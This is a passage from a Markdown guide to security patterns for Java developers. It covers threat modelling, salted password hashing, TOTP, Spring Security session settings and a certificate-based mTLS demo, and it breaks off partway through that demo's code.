---
format: md
---

# Security Patterns

> **Note**: Patterns marked with **(Interview Imp - Java)** are frequently asked in Java interviews
>
> **How to read this file:** Every section ends with a **📘 Terms Explained** table. If you see a word you don't know, check the table right below that section. Each pattern goes from the basic idea to advanced usage (plain Java, Spring Security, infrastructure, pitfalls) and ends with interview questions and a mini cheat sheet.
>
> **What are security patterns?** They answer one question: *"How do we make sure only the right people and systems can do the right things with our data, and that attackers can't trick our code into doing the wrong things?"* This file groups the master list's 12 core security patterns and 30 extended ones into 10 sections: authentication, authorization, OAuth 2.0/OIDC/SSO, tokens, secrets, encryption, injection and input handling, browser-facing web security, edge protection, and data protection, plus the design principles behind all of them.
>
> **Builds on:** [02_Microservices_Pattern.md](../04_Specialized/02_Microservices_Pattern.md#9-access-token-pattern-securing-service-to-service-calls-interview-imp---java) (JWT access tokens between services, mTLS), [08_API_Design_Pattern.md](08_API_Design_Pattern.md) (webhook signatures, error formats), [02_Reliability_Pattern.md](02_Reliability_Pattern.md#6-rate-limiting-pattern-interview-imp---java) (rate limiting) and the security chapter of [Java_Complete_Guide.md](../../java/Java_Complete_Guide.md#195-security-essentials-interview-imp).
>
> **Verified code:** Every main "Complete Java Example" in this file is **plain Java 17 using only the JDK's built-in crypto** (`javax.crypto`, `java.security`) and was compiled and run **three times** with identical output. Where an official test vector exists, the output is checked against it (**RFC 6238** TOTP, **RFC 7636** PKCE). The demos are for learning; production code should use vetted libraries (Spring Security, Nimbus JOSE + JWT, a KMS). To run one, save it as `<ClassName>.java` and run `javac <ClassName>.java && java <ClassName>`. (Running it directly with `java <ClassName>.java` won't work, because the class with `main` is not the first class in the file.)

---

## Table of Contents
1. [Authentication Pattern](#1-authentication-pattern-interview-imp---java) **(Interview Imp - Java)**
   - [1.1 What is Authentication?](#11-what-is-authentication)
   - [1.2 Why Do We Need It (Done Right)?](#12-why-do-we-need-it-done-right)
   - [1.3 How It Works: Passwords, Sessions, Tokens and Other Credentials](#13-how-it-works-passwords-sessions-tokens-and-other-credentials)
   - [1.4 Complete Java Example - Salted Password Hashing and TOTP Codes](#14-complete-java-example---salted-password-hashing-and-totp-codes)
   - [1.5 Authentication in Spring Security](#15-authentication-in-spring-security)
   - [1.6 Pros, Cons, Pitfalls and Interview Questions](#16-pros-cons-pitfalls-and-interview-questions)
   - [1.7 Authentication - Cheat Sheet](#17-authentication---cheat-sheet)
   - [1.8 Deep Dive: Certificate-Based Authentication (mTLS)](#18-deep-dive-certificate-based-authentication-mtls)
2. [Authorization Pattern](#2-authorization-pattern-interview-imp---java) **(Interview Imp - Java)**
   - [2.1 What is Authorization?](#21-what-is-authorization)
   - [2.2 Why Do We Need It?](#22-why-do-we-need-it)
   - [2.3 How It Works: Where and How to Check](#23-how-it-works-where-and-how-to-check)
   - [2.4 Complete Java Example - RBAC, ABAC and Object-Level Checks](#24-complete-java-example---rbac-abac-and-object-level-checks)
   - [2.5 Authorization in Spring Security](#25-authorization-in-spring-security)
   - [2.6 Pros, Cons, Pitfalls and Interview Questions](#26-pros-cons-pitfalls-and-interview-questions)
   - [2.7 Authorization - Cheat Sheet](#27-authorization---cheat-sheet)
   - [2.8 Types and Variants, Including Capability-Based Security](#28-types-and-variants-including-capability-based-security)
3. [OAuth 2.0, OpenID Connect, SSO and Federated Identity](#3-oauth-20-openid-connect-sso-and-federated-identity-interview-imp---java) **(Interview Imp - Java)**
   - [3.1 What Are They?](#31-what-are-they)
   - [3.2 Why Do We Need It?](#32-why-do-we-need-it)
   - [3.3 How It Works: The Grant Types (Flows)](#33-how-it-works-the-grant-types-flows)
   - [3.4 Complete Java Example - Authorization Code Flow with PKCE](#34-complete-java-example---authorization-code-flow-with-pkce)
   - [3.5 OAuth 2.0 and OIDC in Spring](#35-oauth-20-and-oidc-in-spring)
   - [3.6 Pros, Cons, Pitfalls and Interview Questions](#36-pros-cons-pitfalls-and-interview-questions)
   - [3.7 OAuth 2.0 / OIDC - Cheat Sheet](#37-oauth-20--oidc---cheat-sheet)
4. [JWT and Security Tokens](#4-jwt-and-security-tokens-interview-imp---java) **(Interview Imp - Java)**
   - [4.1 What Are Security Tokens and JWTs?](#41-what-are-security-tokens-and-jwts)
   - [4.2 Why Careful Handling Matters](#42-why-careful-handling-matters)
   - [4.3 How It Works: Lifetimes, Revocation and Storage](#43-how-it-works-lifetimes-revocation-and-storage)
   - [4.4 Complete Java Example - Why Verifiers Must Pin the Algorithm](#44-complete-java-example---why-verifiers-must-pin-the-algorithm)
   - [4.5 Tokens in Spring Security](#45-tokens-in-spring-security)
   - [4.6 Interview Questions and Cheat Sheet](#46-interview-questions-and-cheat-sheet)
   - [4.7 Types and Variants, Pros and Cons](#47-types-and-variants-pros-and-cons)
5. [Secret Management Pattern](#5-secret-management-pattern)
   - [5.1 What is Secret Management?](#51-what-is-secret-management)
   - [5.2 Why Do We Need It?](#52-why-do-we-need-it)
   - [5.3 How It Works](#53-how-it-works)
   - [5.4 Complete Java Example - A Tiny Secret Scanner](#54-complete-java-example---a-tiny-secret-scanner)
   - [5.5 Secret Management in Spring and Kubernetes](#55-secret-management-in-spring-and-kubernetes)
   - [5.6 Pitfalls, Interview Questions and Cheat Sheet](#56-pitfalls-interview-questions-and-cheat-sheet)
   - [5.7 Pros and Cons](#57-pros-and-cons)
6. [Encryption at Rest and in Transit](#6-encryption-at-rest-and-in-transit)
   - [6.1 What Are They?](#61-what-are-they)
   - [6.2 Why Do We Need It?](#62-why-do-we-need-it)
   - [6.3 How It Works](#63-how-it-works)
   - [6.4 Complete Java Example - AES-GCM, Tamper Detection and Envelope Encryption](#64-complete-java-example---aes-gcm-tamper-detection-and-envelope-encryption)
   - [6.5 Encryption in Spring Boot and the Cloud](#65-encryption-in-spring-boot-and-the-cloud)
   - [6.6 Pitfalls, Interview Questions and Cheat Sheet](#66-pitfalls-interview-questions-and-cheat-sheet)
   - [6.7 Types and Variants, Pros and Cons](#67-types-and-variants-pros-and-cons)
7. [Input Validation, Injection Prevention and Output Encoding](#7-input-validation-injection-prevention-and-output-encoding-interview-imp---java) **(Interview Imp - Java)**
   - [7.1 What Are They?](#71-what-are-they)
   - [7.2 Why Do We Need It?](#72-why-do-we-need-it)
   - [7.3 How It Works: Defence Layers](#73-how-it-works-defence-layers)
   - [7.4 Complete Java Example - SQL Injection, XSS, Path Traversal and Validation](#74-complete-java-example---sql-injection-xss-path-traversal-and-validation)
   - [7.5 Injection Prevention in Java and Spring](#75-injection-prevention-in-java-and-spring)
   - [7.6 Pitfalls, Interview Questions and Cheat Sheet](#76-pitfalls-interview-questions-and-cheat-sheet)
   - [7.7 Pros and Cons](#77-pros-and-cons)
8. [Web Security: CORS, CSRF, Security Headers, CSP and Clickjacking](#8-web-security-cors-csrf-security-headers-csp-and-clickjacking)
   - [8.1 What Are They?](#81-what-are-they)
   - [8.2 Why Do We Need Them?](#82-why-do-we-need-them)
   - [8.3 How They Work](#83-how-they-work)
   - [8.4 Complete Java Example - CORS Decisions, CSRF Tokens and Headers](#84-complete-java-example---cors-decisions-csrf-tokens-and-headers)
   - [8.5 Web Security in Spring Security](#85-web-security-in-spring-security)
   - [8.6 Pitfalls, Interview Questions and Cheat Sheet](#86-pitfalls-interview-questions-and-cheat-sheet)
   - [8.7 Pros and Cons](#87-pros-and-cons)
9. [Rate Limiting, API Gateway and Defense at the Edge](#9-rate-limiting-api-gateway-and-defense-at-the-edge)
10. [Data Protection: Masking, Tokenization and Privacy by Design](#10-data-protection-masking-tokenization-and-privacy-by-design-interview-imp---java) **(Interview Imp - Java)**
   - [10.1 What Are They?](#101-what-are-they)
   - [10.2 Why Do We Need It?](#102-why-do-we-need-it)
   - [10.3 How It Works](#103-how-it-works)
   - [10.4 Complete Java Example - Masking, Log Scrubbing and Tokenization](#104-complete-java-example---masking-log-scrubbing-and-tokenization)
   - [10.5 Data Protection in Spring and Java](#105-data-protection-in-spring-and-java)
   - [10.6 Pitfalls, Interview Questions and Cheat Sheet](#106-pitfalls-interview-questions-and-cheat-sheet)
   - [10.7 Pros and Cons](#107-pros-and-cons)
11. [How the Security Patterns Fit Together](#11-how-the-security-patterns-fit-together)
   - [11.1 One-Line Summary of Each](#111-one-line-summary-of-each)
   - [11.2 One Request Through Every Layer (Interview Imp - Java)](#112-one-request-through-every-layer-interview-imp---java)
   - [11.3 Decision Guide](#113-decision-guide)
   - [11.4 Look-Alike Concepts](#114-look-alike-concepts)
   - [11.5 Security in the Spring Ecosystem](#115-security-in-the-spring-ecosystem)
   - [11.6 Comparison Table](#116-comparison-table)
12. [Security Patterns Cheat Sheet](#12-security-patterns-cheat-sheet)

---

## Before You Start: Security Goals, Threats and Principles

### The CIA triad (what we protect)

| Goal | Meaning | Attack against it | Example control |
|---|---|---|---|
| **Confidentiality** | Only authorised people can read data | Data breach, eavesdropping | Encryption, access control |
| **Integrity** | Data isn't changed without authorisation | Tampering, injection | Signatures, MACs, validation, audit logs |
| **Availability** | The system works when needed | DDoS, ransomware | Rate limiting, redundancy, backups |

Plus **AAA**: **Authentication** (who are you?), **Authorization** (what may you do?), **Accounting/Auditing** (what did you do?).

### Threat modelling with STRIDE

Before building, ask "what could go wrong?" for each component and data flow:

| Threat | Violates | Example | Mitigation |
|---|---|---|---|
| **S**poofing | Authentication | Fake login, stolen session | Strong auth, MFA, signed tokens |
| **T**ampering | Integrity | Changing the price in a request | Server-side validation, signatures, TLS |
| **R**epudiation | Accountability | "I never placed that order" | Audit logs, signed records |
| **I**nformation disclosure | Confidentiality | Leaking card numbers in logs | Encryption, masking, least privilege |
| **D**enial of service | Availability | Flood of expensive requests | Rate limits, timeouts, autoscaling |
| **E**levation of privilege | Authorization | User calls an admin endpoint | Deny by default, per-object checks |

### Security design principles

| Principle | Meaning | Example |
|---|---|---|
| **Defense in depth** | Several independent layers, so one failure isn't fatal | WAF + gateway auth + service auth + DB permissions + encryption |
| **Least privilege** | Every user/service gets only the access it needs | Read-only DB user for the reporting service |
| **Separation of duties** | No single person/role can complete a critical action alone | One person creates a payment, another approves it |
| **Zero trust** | Never trust a request because of where it comes from; verify every time | mTLS + token checks even inside the cluster |
| **Secure by default** | The default configuration is the safe one | Endpoints require auth unless explicitly made public |
| **Fail securely** | Errors lead to denial, not access | If the permission check throws, deny the request |
| **Complete mediation** | Check authorisation on **every** access, not just the first | Re-check object ownership on each request |
| **Privacy by design** | Collect and keep only the data you need; protect it from the start | Don't store full card numbers; mask in logs |
| **Keep it simple / don't roll your own crypto** | Complex, home-made security breaks | Use Spring Security, JDK/KMS crypto, standard protocols |

### The OWASP Top 10 (2021) at a glance

| # | Risk | Covered in |
|---|---|---|
| A01 | Broken Access Control | Section 2 |
| A02 | Cryptographic Failures | Sections 1, 6 |
| A03 | Injection (SQL, XSS, command) | Section 7 |
| A04 | Insecure Design | Principles above, threat modelling |
| A05 | Security Misconfiguration | Sections 5, 8 |
| A06 | Vulnerable and Outdated Components | Dependency scanning (OWASP Dependency-Check, Snyk, Dependabot) |
| A07 | Identification and Authentication Failures | Sections 1, 3, 4 |
| A08 | Software and Data Integrity Failures | Signed artifacts, safe deserialization (section 7) |
| A09 | Security Logging and Monitoring Failures | Section 10 |
| A10 | Server-Side Request Forgery (SSRF) | Section 7 |

> OWASP periodically updates the list (a 2025 edition followed the 2021 one); check owasp.org for the current version. The underlying risks change slowly.

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **CIA triad** | Confidentiality, Integrity, Availability: the three core security goals. |
| **Threat model** | A structured list of what could go wrong, who might attack, and how you'll defend. |
| **STRIDE** | Microsoft's threat categories: Spoofing, Tampering, Repudiation, Information disclosure, DoS, Elevation of privilege. |
| **Attack surface** | All the places an attacker can try to get in (endpoints, ports, inputs, dependencies). |
| **OWASP** | Open Worldwide Application Security Project: publishes the Top 10, cheat sheets and tools. |
| **Zero trust** | Security model where no network location is trusted by default; every request is verified. |

---

# 1. Authentication Pattern (Interview Imp - Java)

## 1.1 What is Authentication?

**Authentication** verifies **who** someone (or something) is. A user or service presents **credentials**; the system checks them and establishes an **identity**, then remembers it for later requests with a **session** or a **token**.

**Analogy:** Airport security checking your passport at the entrance. Once checked, you get a boarding pass (session/token) that you show at the gate instead of your passport each time.

| Factor | "Something you..." | Examples |
|---|---|---|
| **Knowledge** | know | Password, PIN |
| **Possession** | have | Phone (TOTP app, SMS), hardware key, smart card, client certificate |
| **Inherence** | are | Fingerprint, face |

**Multi-factor authentication (MFA)** combines **two or more different** factors (password + phone code). Two passwords aren't MFA.

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **Authentication (AuthN)** | Proving identity. |
| **Credential** | What you present to prove identity (password, token, certificate). |
| **Principal** | The authenticated identity (a user or a service). |
| **MFA / 2FA** | Multi-/two-factor authentication: more than one kind of proof. |
| **TOTP** | Time-based One-Time Password: a 6-digit code that changes every 30 seconds. |
| **Passkey / WebAuthn** | Passwordless login using a device-bound key pair (fingerprint/face unlocks it). |

---

## 1.2 Why Do We Need It (Done Right)?

Weak authentication is behind most account takeovers: leaked password databases, credential stuffing (reusing passwords from other breaches), phishing, brute force. Doing it right means:

| Risk | Defence |
|---|---|
| Database leak exposes passwords | **Slow, salted password hashing** (never encryption, never plain/fast hashes) |
| Credential stuffing / brute force | MFA, rate limiting, lockout/backoff, breached-password checks |
| Phishing | Phishing-resistant MFA (passkeys/WebAuthn, hardware keys) |
| Session hijacking | Secure cookie flags, short sessions, rotation after login |
| Account enumeration ("user not found" vs "wrong password") | Same generic error and timing for both |

---

## 1.3 How It Works: Passwords, Sessions, Tokens and Other Credentials

### Storing passwords

| Approach | Verdict |
|---|---|
| Plain text | ❌ Never |
| Encryption (reversible) | ❌ If the key leaks, every password leaks |
| MD5 / SHA-1 / SHA-256 | ❌ Too fast: billions of guesses per second on GPUs; identical passwords give identical hashes |
| SHA-256 + salt | ❌ Still too fast |
| **Argon2id, scrypt, bcrypt, PBKDF2 (high iterations)** | ✅ Deliberately **slow** and **salted** password hashing functions |

- **Salt:** random bytes, unique per password, stored next to the hash. Defeats precomputed rainbow tables and makes identical passwords hash differently.
- **Pepper (optional):** a secret added to all hashes, stored **outside** the database (e.g. in a vault/HSM).
- **Work factor:** tune so one hash takes roughly 100-500 ms on your servers; raise it over time and re-hash on next login.

### Remembering the user: sessions vs tokens

| | Server session + cookie | Token (e.g. JWT) |
|---|---|---|
| Where state lives | Server (memory/Redis), cookie holds a random session ID | In the token itself (signed) |
| Revocation | Easy: delete the session | Hard until expiry (short lifetimes, deny-lists) |
| Scaling | Needs shared session store (Spring Session + Redis) | Stateless verification |
| Typical use | Server-rendered web apps, BFFs | APIs, mobile apps, service-to-service |
| Browser risk | CSRF (cookie sent automatically) | XSS if stored in `localStorage` |

**Secure session management:** random, long session IDs; cookies with `Secure`, `HttpOnly`, `SameSite`; **rotate the session ID after login** (prevents session fixation); idle and absolute timeouts; invalidate on logout and password change.

### Other credentials

| Credential | Use | Notes |
|---|---|---|
| **API key** | Identify a calling application/partner | Not a user identity; send in a header, never in URLs; hash at rest; rotate; scope and rate-limit per key |
| **Client certificate (mTLS)** | Service-to-service or B2B identity | Both sides present X.509 certificates; strong, no shared secrets |
| **OAuth2/OIDC tokens** | Delegated user identity (section 3) | Access tokens, ID tokens, refresh tokens |
| **Passkeys (WebAuthn/FIDO2)** | Passwordless, phishing-resistant user login | Private key never leaves the device |

---

## 1.4 Complete Java Example - Salted Password Hashing and TOTP Codes

```java
import java.nio.ByteBuffer;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.HexFormat;
import javax.crypto.Mac;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

// ----- 1) Password hashing: slow, salted, one-way (PBKDF2 is built into the JDK; BCrypt/Argon2 via Spring Security) -----
class PasswordHasher {
    static final int ITERATIONS = 600_000;          // OWASP recommendation for PBKDF2-HMAC-SHA256
    static final SecureRandom RANDOM = new SecureRandom();

    static String hash(char[] password) throws Exception {
        byte[] salt = new byte[16];
        RANDOM.nextBytes(salt);                     // a NEW random salt per user/password
        byte[] dk = derive(password, salt, ITERATIONS);
        return "pbkdf2-sha256$" + ITERATIONS + "$" + Base64.getEncoder().encodeToString(salt) + "$" + Base64.getEncoder().encodeToString(dk);
    }

    static boolean verify(char[] password, String stored) throws Exception {
        String[] p = stored.split("\\$");
        byte[] salt = Base64.getDecoder().decode(p[2]);
        byte[] expected = Base64.getDecoder().decode(p[3]);
        byte[] actual = derive(password, salt, Integer.parseInt(p[1]));
        return MessageDigest.isEqual(expected, actual);                  // constant-time comparison
    }

    private static byte[] derive(char[] password, byte[] salt, int iterations) throws Exception {
        PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, 256);
        return SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(spec).getEncoded();
    }
}

// ----- 2) TOTP (RFC 6238): the 6/8-digit codes from Google Authenticator & co. -----
class Totp {
    static String code(byte[] secret, long unixSeconds, int digits, String hmac) throws Exception {
        long counter = unixSeconds / 30;                                 // 30-second time steps
        Mac mac = Mac.getInstance(hmac);
        mac.init(new SecretKeySpec(secret, hmac));
        byte[] h = mac.doFinal(ByteBuffer.allocate(8).putLong(counter).array());
        int offset = h[h.length - 1] & 0x0F;                             // dynamic truncation
        int binary = ((h[offset] & 0x7F) << 24) | ((h[offset + 1] & 0xFF) << 16) | ((h[offset + 2] & 0xFF) << 8) | (h[offset + 3] & 0xFF);
        int mod = (int) Math.pow(10, digits);
        return String.format("%0" + digits + "d", binary % mod);
    }
}

public class AuthenticationDemo {
    public static void main(String[] args) throws Exception {
        System.out.println("1) Password hashing");
        String plainSha = HexFormat.of().formatHex(MessageDigest.getInstance("SHA-256").digest("Password@123".getBytes()));
        System.out.println("   plain SHA-256 (WRONG: fast, unsalted, same for every user) = " + plainSha.substring(0, 16) + "...");
        String asha = PasswordHasher.hash("Password@123".toCharArray());
        String ravi = PasswordHasher.hash("Password@123".toCharArray());
        System.out.println("   stored format = " + asha.substring(0, asha.indexOf('$', 15)) + "$<salt>$<hash>");
        System.out.println("   same password, two users -> different stored hashes: " + !asha.equals(ravi));
        System.out.println("   login with correct password -> " + PasswordHasher.verify("Password@123".toCharArray(), asha));
        System.out.println("   login with wrong password   -> " + PasswordHasher.verify("password@123".toCharArray(), asha));

        System.out.println("2) TOTP second factor, checked against the RFC 6238 test vectors (secret = \"12345678901234567890\")");
        byte[] secret = "12345678901234567890".getBytes();
        System.out.println("   T=59         -> " + Totp.code(secret, 59, 8, "HmacSHA1") + "  (RFC expects 94287082)");
        System.out.println("   T=1111111109 -> " + Totp.code(secret, 1111111109L, 8, "HmacSHA1") + "  (RFC expects 07081804)");
        System.out.println("   6-digit app code at T=59 -> " + Totp.code(secret, 59, 6, "HmacSHA1") + "  (valid for this 30 s window only)");
    }
}
```

**Output:**
```
1) Password hashing
   plain SHA-256 (WRONG: fast, unsalted, same for every user) = ff7bd97b1a7789dd...
   stored format = pbkdf2-sha256$600000$<salt>$<hash>
   same password, two users -> different stored hashes: true
   login with correct password -> true
   login with wrong password   -> false
2) TOTP second factor, checked against the RFC 6238 test vectors (secret = "12345678901234567890")
   T=59         -> 94287082  (RFC expects 94287082)
   T=1111111109 -> 07081804  (RFC expects 07081804)
   6-digit app code at T=59 -> 287082  (valid for this 30 s window only)
```

What the output shows:
- A plain SHA-256 hash is the **same for every user** with that password and can be cracked at GPU speed: don't use it.
- PBKDF2 with **600,000 iterations** and a **random salt** produced **different** stored values for two users with the same password; verification worked for the right password and failed for a one-character difference. Comparison is **constant-time** (`MessageDigest.isEqual`).
- The TOTP implementation reproduced the **official RFC 6238 test vectors** exactly (`94287082`, `07081804`), the same algorithm authenticator apps use.

---

## 1.5 Authentication in Spring Security

```java
@Configuration
@EnableWebSecurity
class SecurityConfig {

    @Bean
    PasswordEncoder passwordEncoder() {
        return PasswordEncoderFactories.createDelegatingPasswordEncoder();   // stores "{bcrypt}$2a$10$..." ; can upgrade algorithms later
    }

    @Bean
    SecurityFilterChain web(HttpSecurity http) throws Exception {
        return http
                .authorizeHttpRequests(a -> a
                        .requestMatchers("/", "/login", "/css/**").permitAll()
                        .anyRequest().authenticated())                                     // secure by default
                .formLogin(Customizer.withDefaults())
                .sessionManagement(s -> s
                        .sessionFixation(f -> f.changeSessionId())                          // new session id after login
                        .maximumSessions(3))
                .logout(l -> l.deleteCookies("JSESSIONID").invalidateHttpSession(true))
                .build();
    }

    @Bean
    UserDetailsService users(UserRepository repo) {
        return username -> repo.findByEmail(username)
                .map(u -> User.withUsername(u.email()).password(u.passwordHash()).roles(u.roles().toArray(String[]::new)).build())
                .orElseThrow(() -> new UsernameNotFoundException("bad credentials"));      // generic message
    }
}
```

```yaml
server:
  servlet:
    session:
      timeout: 30m
      cookie:
        http-only: true
        secure: true
        same-site: lax
spring:
  session:
    store-type: redis          # Spring Session: share sessions across instances (needs spring-session-data-redis)
```

| Feature | Spring support |
|---|---|
| Password hashing | `BCryptPasswordEncoder`, `Argon2PasswordEncoder`, `Pbkdf2PasswordEncoder`, `DelegatingPasswordEncoder` (`{id}` prefix lets you migrate algorithms) |
| Login options | Form login, HTTP Basic, `oauth2Login()` (OIDC/SSO, section 3), X.509 client certificates, passkeys/WebAuthn (recent Spring Security versions) |
| Brute-force defence | Rate limiting at the gateway, `AuthenticationFailureBadCredentialsEvent` listeners for lockout/backoff |
| MFA | Built into recent Spring Security releases; otherwise a custom second step (e.g. a TOTP verification filter/endpoint) |

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **Salt** | Random per-password value mixed into the hash so identical passwords hash differently. |
| **Pepper** | A secret mixed into all password hashes, stored outside the database. |
| **Work factor / cost** | How slow the hashing function is made (iterations, memory). |
| **Rainbow table** | A precomputed table of hashes for common passwords. |
| **Credential stuffing** | Trying username/password pairs leaked from other sites. |
| **Session fixation** | An attacker sets a victim's session ID before login, then uses it afterwards. |
| **`DelegatingPasswordEncoder`** | Spring encoder that reads the `{bcrypt}`/`{argon2}` prefix to pick the right algorithm. |

---

## 1.6 Pros, Cons, Pitfalls and Interview Questions

| Pitfall | Fix |
|---|---|
| Fast or unsalted password hashes | Argon2id/bcrypt/scrypt/PBKDF2 with proper cost. |
| "User not found" vs "Wrong password" messages | One generic error; similar response time. |
| No rate limiting on login / OTP endpoints | Per-account and per-IP limits, exponential backoff, CAPTCHA after failures. |
| Keeping the same session ID after login | Rotate it (`changeSessionId`). |
| SMS-only MFA for high-value accounts | Prefer TOTP apps, push, or phishing-resistant passkeys. |
| API keys in query strings or front-end code | Header only; server-side only; hash at rest; rotate. |
| Passwords in logs (e.g. request logging) | Mask sensitive fields (section 10). |

**Q1. How should passwords be stored?** With a slow, salted password-hashing function (Argon2id, bcrypt, scrypt or high-iteration PBKDF2), unique random salt per password, optional pepper, verified with constant-time comparison. Never encrypted, plain, or with a fast hash.

**Q2. Why is a salt needed?** It makes identical passwords hash differently and defeats precomputed rainbow tables, forcing attackers to crack each hash separately.

**Q3. Session vs token authentication?** Sessions keep state server-side (easy revocation, needs a shared store; CSRF risk with cookies). Tokens are self-contained and stateless (scale easily; hard to revoke; XSS risk if stored in JS-accessible storage).

**Q4. What is MFA and why does it matter?** Requiring two or more different factor types; a stolen password alone is no longer enough.

**Q5. How do you prevent session fixation?** Issue a new session ID after successful authentication (Spring Security does this by default).

---

## 1.7 Authentication - Cheat Sheet

```
AUTHENTICATION  Prove identity: know / have / are. MFA = different factor types (TOTP, push, passkeys).
          Passwords: Argon2id / bcrypt / scrypt / PBKDF2 (600k+), random salt per password, optional pepper, constant-time compare.
          Sessions (server state, easy revoke, CSRF) vs tokens (stateless, hard revoke). Cookies: Secure, HttpOnly, SameSite;
          rotate session id after login; timeouts. Generic errors; rate-limit logins. API keys = app identity (header, hashed, rotated).
          Spring: DelegatingPasswordEncoder, SecurityFilterChain, formLogin/oauth2Login, sessionFixation().changeSessionId(), Spring Session.
```

---

## 1.8 Deep Dive: Certificate-Based Authentication (mTLS)

**What it is.** Instead of a password or token, the client proves its identity with an **X.509 certificate** and the matching **private key** during the TLS handshake. In **mutual TLS (mTLS)** both sides present certificates: the client checks the server *and* the server checks the client. The server trusts a client because its certificate **chains up to a certificate authority (CA)** the server trusts, not because of the name written in it.

**Where it is used:** service-to-service calls (service meshes such as Istio/Linkerd issue a certificate per workload, SPIFFE IDs), IoT devices ([09_IoT_Pattern.md](../04_Specialized/09_IoT_Pattern.md)), banking/partner APIs (open banking requires mTLS), smart cards and corporate client certificates, VPNs.

**How it works**
```mermaid
sequenceDiagram
    participant C as Client (orders-service)
    participant S as Server (payments API)
    C->>S: ClientHello
    S-->>C: server certificate (signed by CA) + CertificateRequest
    C->>C: verify server chain against trusted CA, check hostname
    C->>S: client certificate + CertificateVerify (signed with client private key)
    S->>S: verify chain to trusted CA, validity dates, revocation, key usage
    S-->>C: Finished: authenticated channel, identity = certificate subject or SAN
```

**Complete Java example - mTLS with a private CA (only the JDK).** The program uses the JDK's `keytool` to create a CA, a server certificate, a CA-signed client certificate and a *self-signed* impostor with the same name, then runs a TLS 1.3 server that **requires** client certificates.

```java
import java.io.*;
import java.nio.file.*;
import java.security.KeyStore;
import java.security.cert.X509Certificate;
import java.util.*;
import java.util.concurrent.*;
import javax.net.ssl.*;

public class CertAuthDemo {

    static final String PW = "changeit";

    // Uses the JDK's own 'keytool' to create a small private CA and certificates (no libraries needed)
    static void keytool(Path dir, String... args) throws Exception {
        List<String> cmd = new ArrayList<>(List.of(Paths.get(System.getProperty("java.home"), "bin", "keytool").toString()));
        cmd.addAll(List.of(args));
        Process p = new ProcessBuilder(cmd).directory(dir.toFile()).redirectErrorStream(true).start();
        String out = new String(p.getInputStream().readAllBytes());
        if (p.waitFor() != 0) throw new IllegalStateException("keytool failed: " + out);
    }
    static void genKey(Path d, String store, String alias, String dn, boolean ca) throws Exception {
        List<String> a = new ArrayList<>(List.of("-genkeypair", "-alias", alias, "-keyalg", "EC", "-groupname", "secp256r1", "-dname", dn,
                "-validity", "365", "-keystore", store, "-storepass", PW, "-keypass", PW, "-storetype", "PKCS12"));
        if (ca) a.addAll(List.of("-ext", "bc:c"));
        keytool(d, a.toArray(String[]::new));
    }
    // CA signs a certificate request, then the signed chain is imported back into the owner's keystore
    static void signWithCa(Path d, String store, String alias) throws Exception {
        keytool(d, "-certreq", "-alias", alias, "-keystore", store, "-storepass", PW, "-file", alias + ".csr");
        keytool(d, "-gencert", "-alias", "ca", "-keystore", "ca.p12", "-storepass", PW, "-infile", alias + ".csr", "-outfile", alias + ".crt", "-validity", "365");
        keytool(d, "-importcert", "-noprompt", "-alias", "ca", "-file", "ca.crt", "-keystore", store, "-storepass", PW);
        keytool(d, "-importcert", "-noprompt", "-alias", alias, "-file", alias + ".crt", "-keystore", store, "-storepass", PW);
    }

    static SSLContext context(Path keystore, Path truststore) throws Exception {
        KeyManagerFactory kmf = null;
        if (keystore != null) {
            KeyStore ks = KeyStore.getInstance("PKCS12"); try (InputStream in = Files.newInputStream(keystore)) { ks.load(in, PW.toCharArray()); }
            kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm()); kmf.init(ks, PW.toCharArray());
        }
        KeyStore ts = KeyStore.getInstance("PKCS12"); try (InputStream in = Files.newInputStream(truststore)) { ts.load(in, PW.toCharArray()); }
        TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm()); tmf.init(ts);
        SSLContext ctx = SSLContext.getInstance("TLSv1.3");
        ctx.init(kmf == null ? null : kmf.getKeyManagers(), tmf.getTrustManagers(), null);
        return ctx;
    }

    // one connection: server REQUIRES a client certificate (mutual TLS) and answers with the authenticated identity
    static String attempt(String label, SSLContext server, SSLContext client) throws Exception {
        try (SSLServerSocket ss = (SSLServerSocket) server.getServerSocketFactory().createServerSocket(0)) {
            ss.setNeedClientAuth(true);
            ExecutorService ex = Executors.newSingleThreadExecutor();
            Future<String> serverSide = ex.submit(() -> {
                try (SSLSocket s = (SSLSocket) ss.accept()) {
                    s.startHandshake();
                    X509Certificate c = (X509Certificate) s.getSession().getPeerCertificates()[0];
                    String who = c.getSubjectX500Principal().getName();
                    s.getOutputStream().write(("hello " + who + "\n").getBytes()); s.getOutputStream().flush();
                    return "server authenticated client as " + who;
                } catch (Exception e) { return "server rejected the connection (" + e.getClass().getSimpleName() + ")"; }
            });
            String clientSide;
            try (SSLSocket c = (SSLSocket) client.getSocketFactory().createSocket("localhost", ss.getLocalPort())) {
                c.startHandshake();
                clientSide = new BufferedReader(new InputStreamReader(c.getInputStream())).readLine();
                if (clientSide == null) clientSide = "connection closed by server";
            } catch (Exception e) { clientSide = "client failed (" + e.getClass().getSimpleName() + ")"; }
            String srv = serverSide.get(10, TimeUnit.SECONDS); ex.shutdownNow();
            return String.format("%-36s | %s | client got: %s", label, srv, clientSide);
        }
    }

    public static void main(String[] args) throws Exception {
        Path d = Files.createTempDirectory("mtls-demo");
        genKey(d, "ca.p12", "ca", "CN=Demo Internal CA", true);
        keytool(d, "-exportcert", "-rfc", "-alias", "ca", "-keystore", "ca.p12", "-storepass", PW, "-file", "ca.crt");
        keytool(d, "-importcert", "-noprompt", "-alias", "ca", "-file", "ca.crt", "-keystore", "trust.p12", "-storepass", PW, "-storetype", "PKCS12");
        genKey(d, "server.p12", "server", "CN=localhost", false);        signWithCa(d, "server.p12", "server");
        genKey(d, "orders.p12", "orders", "CN=orders-service,OU=payments", false); signWithCa(d, "orders.p12", "orders");
        genKey(d, "rogue.p12", "rogue", "CN=orders-service,OU=payments", false);      // same NAME, but self-signed (not issued by our CA)

        SSLContext server = context(d.resolve("server.p12"), d.resolve("trust.p12"));
